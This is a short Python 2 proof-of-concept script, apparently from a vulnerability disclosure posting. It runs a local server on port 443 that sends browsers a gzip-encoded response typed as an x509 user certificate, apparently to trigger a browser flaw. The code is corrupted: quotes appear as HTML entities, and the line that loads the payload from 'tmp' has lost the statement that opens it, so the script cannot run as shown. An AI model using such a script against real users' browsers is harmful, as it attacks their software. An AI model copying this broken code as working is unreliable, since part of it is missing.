 
import socket
import sys
import time
 
kHost = &#039;127.0.0.1&#039;
kPort = 443
 
def bind_listen():
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
  s.bind((kHost, kPort))
  s.listen(1)
  return s
 
def send_certificate(c, r):
  print &#039;[*] sending certificate&#039;
  payload = &#039;&#039;
    payload = tmp.read()
  c.send(&#039;HTTP/1.1 200 OK\r\n&#039;)
  c.send(&#039;Content-Type: application/x-x509-user-cert\r\n&#039;)
  c.send(&#039;Content-Encoding: gzip\r\n&#039;)
  c.send(&#039;Content-Length: {}\r\n&#039;.format(len(payload)))
  c.send(&#039;\r\n&#039;)
  c.send(payload)
 
def main():
  print &#039;[*] listening for connection on port {}:{}&#039;.format(kHost, kPort)
  s = bind_listen()
  while True:
    c, (host, port) = s.accept()
    print &#039;[*] connection from {}:{}&#039;.format(host, port)
    while True:
      r = c.recv(1024)
      if &#039;favicon&#039; in r:
        c.send(&#039;HTTP/1.1 404 Not Found\r\n\r\n&#039;)
      else:
        send_certificate(c, r)
        time.sleep(20)
        sys.exit(0)
 
if __name__ == &#039;__main__&#039;:
  main()
 
Thanks,
Paulos Yibelo

